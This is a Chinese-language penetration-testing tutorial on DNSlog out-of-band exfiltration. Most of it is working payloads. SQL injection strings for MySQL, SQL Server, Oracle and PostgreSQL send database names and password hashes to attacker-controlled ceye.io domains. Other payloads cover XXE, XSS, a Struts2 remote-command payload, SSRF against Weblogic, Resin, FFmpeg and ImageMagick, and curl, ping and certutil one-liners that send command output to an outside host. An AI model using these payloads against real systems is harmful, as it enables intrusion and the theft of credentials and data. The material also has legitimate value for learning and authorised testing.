<!-- TOC -->

- [前言](#前言)
- [技术说明](#技术说明)
- [利用场景](#利用场景)
- [技术原理](#技术原理)
- [利用细节](#利用细节)
    - [SQL注入](#sql注入)
        - [MySQL](#mysql)
        - [SQL Server](#sql-server)
        - [Oracle](#oracle)
        - [PostgreSQL](#postgresql)
    - [SQLMap配合DNSlog](#sqlmap配合dnslog)
    - [命令执行](#命令执行)
    - [SSRF](#ssrf)
    - [XSS](#xss)
    - [其他](#其他)
        - [XML Entity Injection](#xml-entity-injection)
        - [Struts2](#struts2)
        - [FFMpeg](#ffmpeg)
        - [Weblogic](#weblogic)
        - [ImageMagick](#imagemagick)
        - [Resin](#resin)
- [DNSlog平台的搭建](#dnslog平台的搭建)
- [扩展：HTTP log](#扩展http-log)
- [Linux](#linux)
- [windows](#windows)
- [参考](#参考)

<!-- /TOC -->
## 前言
&emsp;我们在测试盲注的时候，发现速度非常慢，那这个时候，爱思考的人就想到了利用DNS来突破这个限制，准确来说是利用DNS的log功能。

## 技术说明
&emsp;DNSlog注入属于带外通信的一种，英文：Out of Band，简称：OOB。我们之前的注入都是在同一个信道上面的，比如我们之前的联合查询注入，都是做HTTP请求，然后得到HTTP返回包，没有涉及到其他的信道，比如DNS。而带外通信，至少是要涉及到两个信道的。信道：在计算机中，指通信的通道，是信号传输的媒介。


## 利用场景
&emsp;每项技术都有其利用场景，并非万能的，而DNS log注入技术也是，我们在进行SQL盲注、命令执行、SSRF及XSS等攻击而无法看到回显结果时，就会用到该技术。

## 技术原理
![](https://p4.ssl.qhimg.com/t01a278167ad3a008db.jpg)

如图所示，作为攻击者，提交注入语句，让数据库把需要查询的值和域名拼接起来，然后发生DNS查询，我们只要能获得DNS的日志，就得到了想要的值。所以我们需要有一个自己的域名，然后在域名商处配置一条NS记录，然后我们在NS服务器上面获取DNS日志即可。

简单说就是：DNSLog 用于监测 DNS 和 HTTP 访问记录，可通过HTTP请求，让目标主机主动请求 DNSLog API 地址，有相应的解析记录，则可判定为存在相应的漏洞。

![](https://www.github.com/52stu/Images/raw/master/小书匠/1572073038092.png)

## 利用细节
### SQL注入
#### MySQL
* 支持load_file()函数（高版本默认不支持）
* 开启allow_url_fopen（默认开启）

主体语句：`select load_file(concat('\\\\',hex((select database())),'.8dmer4.ceye.io\\abv'));`

dvwa实战语句1：`1' and if((select load_file(concat('\\\\',hex((select 212)),'.8dmer4.ceye.io\\abv'))),1,0) And '1'='1`

dvwa实战语句2：`1' and if((select load_file(concat('\\\\',hex((select schema_name from information_schema.schemata limit 0,1)),'.8dmer4.ceye.io\\abv'))),1,0) And '1'='1`


**UNC路径**

以下是百度的UNC路径的解释
>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。

其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式`\\sss.xxx\test\`

这也就解释了为什么CONCAT()函数拼接了4个\了，因为转义的原因，4个就变\成了2个\，目的就是利用UNC路径。

**因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据**

#### SQL Server
主体语句：`DECLARE @host varchar(1024);SELECT @host=CONVERT(varchar(1024),db_name())+'.8dmer4.ceye.io';EXEC('master..xp_dirtree "\\'+@host+'\foobar$"');`

实战语句：`';DECLARE @host varchar(1024);SELECT @host=CONVERT(varchar(1024),db_name())+'.8dmer4.ceye.io';EXEC('master..xp_dirtree "\\'+@host+'\foobar$"')--`

#### Oracle
```
SELECT UTL_INADDR.GET_HOST_ADDRESS('ip.port.b182oj.ceye.io');
SELECT UTL_HTTP.REQUEST('http://ip.port.b182oj.ceye.io/oracle') FROM DUAL;
SELECT HTTPURITYPE('http://ip.port.b182oj.ceye.io/oracle').GETCLOB() FROM DUAL;
SELECT DBMS_LDAP.INIT(('oracle.ip.port.b182oj.ceye.io',80) FROM DUAL;
SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.ip.port.b182oj.ceye.io',80) FROM DUAL;
```


#### PostgreSQL
```
DROP TABLE IF EXISTS table_output;
CREATE TABLE table_output(content text);
CREATE OR REPLACE FUNCTION temp_function()
RETURNS VOID AS $
DECLARE exec_cmd TEXT;
DECLARE query_result TEXT;
BEGIN
SELECT INTO query_result (SELECT passwd
FROM pg_shadow WHERE usename='postgres');
exec_cmd := E'COPY table_output(content)
FROM E\'\\\\\\\\'||query_result||E'.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\'';
EXECUTE exec_cmd;
END;
$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT temp_function();
```

### SQLMap配合DNSlog

### 命令执行
* Linux
```
curl http://ip.port.b182oj.ceye.io/`whoami`
ping -c 1 `whoami`.ip.port.b182oj.ceye.io
```

* Windows
```
ping %USERNAME%.b182oj.ceye.io

变量                     类型       描述
%ALLUSERSPROFILE%        本地       返回“所有用户”配置文件的位置。
%APPDATA%                本地       返回默认情况下应用程序存储数据的位置。
%CD%                     本地       返回当前目录字符串。
%CMDCMDLINE%             本地       返回用来启动当前的 Cmd.exe 的准确命令行。
%CMDEXTVERSION%          系统       返回当前的“命令处理程序扩展”的版本号。
%COMPUTERNAME%           系统       返回计算机的名称。
%COMSPEC%                系统       返回命令行解释器可执行程序的准确路径。
%DATE%                   系统       返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。
%ERRORLEVEL%             系统       返回上一条命令的错误代码。通常用非零值表示错误。
%HOMEDRIVE%              系统       返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
%HOMEPATH%               系统       返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
%HOMESHARE%              系统       返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
%LOGONSERVER%            本地       返回验证当前登录会话的域控制器的名称。
%NUMBER_OF_PROCESSORS%   系统       指定安装在计算机上的处理器的数目。
%OS%                     系统       返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。
%PATH%                   系统       指定可执行文件的搜索路径。
%PATHEXT%                系统       返回操作系统认为可执行的文件扩展名的列表。
%PROCESSOR_ARCHITECTURE% 系统       返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。
%PROCESSOR_IDENTFIER%    系统       返回处理器说明。
%PROCESSOR_LEVEL%        系统       返回计算机上安装的处理器的型号。
%PROCESSOR_REVISION%     系统       返回处理器的版本号。
%PROMPT%                 本地       返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。
%RANDOM%                 系统       返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。
%SYSTEMDRIVE%            系统       返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。
%SYSTEMROOT%             系统       返回 Windows server operating system 根目录的位置。
%TEMP%和%TMP%            系统和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。
%TIME%                   系统       返回当前时间。使用与                                                                                   time       /t                                                                     命令相同的格式。由         Cmd.exe                  生成。有关                       time   命令的详细信息，请参阅 Time。
%USERDOMAIN%             本地       返回包含用户帐户的域的名称。
%USERNAME%               本地       返回当前登录的用户的名称。
%USERPROFILE%            本地       返回当前用户的配置文件的位置。
%WINDIR%                 系统       返回操作系统目录的位置。
```

### SSRF



```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://ip.port.b182oj.ceye.io/xxe_test">
%remote;]>
<root/>
```

### XSS
`><img src=http://xss.xxxx.ceye.io/aaa>`



### 其他
#### XML Entity Injection
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://ip.port.b182oj.ceye.io/xxe_test">
%remote;]>
<root/>
```

#### Struts2
```
xx.action?redirect:http://ip.port.b182oj.ceye.io/%25{3*4}
xx.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'whoami'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://ip.port.b182oj.ceye.io/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
```

#### FFMpeg
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://ip.port.b182oj.ceye.io
#EXT-X-ENDLIST
```

#### Weblogic
```
xxoo.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://ip.port.b182oj.ceye.io/test&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Businesslocation&btnSubmit=Search
```

#### ImageMagick
```
push graphic-context
viewbox 0 0 640 480
fill 'url(http://ip.port.b182oj.ceye.io)'
pop graphic-context
```

#### Resin
```
xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://ip.port.b182oj.ceye.io/ssrf
```

## DNSlog平台的搭建
&emsp;在我们实际的渗透中，我们不想使用一些别人家搭建的DNSlog平台，比较还是有可能被记录在别人的服务器上面的，这就涉及到保密的问题，那么就需要有自己可控的DNSlog平台。

&emsp;这里推荐BugScanTeam的 https://github.com/BugScanTeam/DNSLog ，该项目主页是有搭建教程的，按自己的需求搭建。


## 扩展：HTTP log
&emsp;除开利用DNS的log，在可以执行系统命令的情况还可以利用HTTP的log，就是通过中间件的日志来获取结果。

## Linux
`for /F "delims=\" %i in ('whoami') do curl http://www.dark5.net/%i`

如果碰到内容有空格（换行符等），就会截断，只输出前面的，这时候可以利用编码来输出，但有输出字符数最大限制；
```
curl http://xxx.dnslog.link/$(id|base64)
curl http://xxx.dnslog.link/`id|base64`
```

## windows 
`for /F %x in ('whoami') do start https://www.dark5.net/%x` #启动浏览器访问

`for /F %x in ('whoami') do certutil.exe -urlcache -split -f https://www.dark5.net/%x` #内置命令行工具访问

`for /F %x in ('dir /b') do certutil.exe -urlcache -split -f https://www.dark5.net/%x` #只列出文件名


**windows下的base64编码**

*暂时未找到能直接像Linux那样可以通过管道来加密的，但通过多次命令的执行达到先base64加密，再做HTTP请求*
```
whoami > result.txt
certutil -encode result.txt result_bs64
for /f %x in (result_bs64) do certutil.exe -urlcache -split -f http://dvwa.dark5.net/%x
```

![](https://www.github.com/52stu/Images/raw/master/小书匠/1572108688380.png)


*每一个请求都会出现两个请求日志，所以要去重复！* 并把结果保存为`result_bs64_local`
```
ZGVza3RvcC1xOTl1dHJzXGhhY2tlcg0K
```

然后再把这个`result_bs64_local`里面加密的文件内容解密，命令为：`certutil -decode result_bs64_local result_local.txt`

![](https://www.github.com/52stu/Images/raw/master/小书匠/1572108884909.png)

![](https://www.github.com/52stu/Images/raw/master/小书匠/1572109060661.png)


## 参考
[dnslog利用](http://byd.dropsec.xyz/2016/12/04/dnslog%E5%88%A9%E7%94%A8/)

[Dnslog在SQL注入中的实战](https://www.anquanke.com/post/id/98096)

[突破延迟注入和盲注速度限制，利用dns注入快速获取数据](https://phpinfo.me/2016/05/10/1210.html)

[sqlmap利用DNS进行oob(out of band)注入（转）](https://www.cnblogs.com/backlion/p/8984121.html)


[渗透技巧-mssql盲注与dnslog的完美结合(命令执行)](http://lawlietweb.com/2019/01/11/mssql%E7%9B%B2%E6%B3%A8%E4%B8%8Ednslog%E7%9A%84%E5%AE%8C%E7%BE%8E%E7%BB%93%E5%90%88(%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)/)

[HawkEye Log/Dns 在Sql注入中的应用](http://docs.hackinglab.cn/HawkEye-Log-Dns-Sqli.html)

[Oracle注入之带外通信](https://www.cnblogs.com/-qing-/p/10952341.html)

[带外通道技术（OOB）总结](https://www.freebuf.com/articles/web/201013.html)

[DNSLOG使用技巧](http://www.tiaozhanziwo.com/archives/851.html)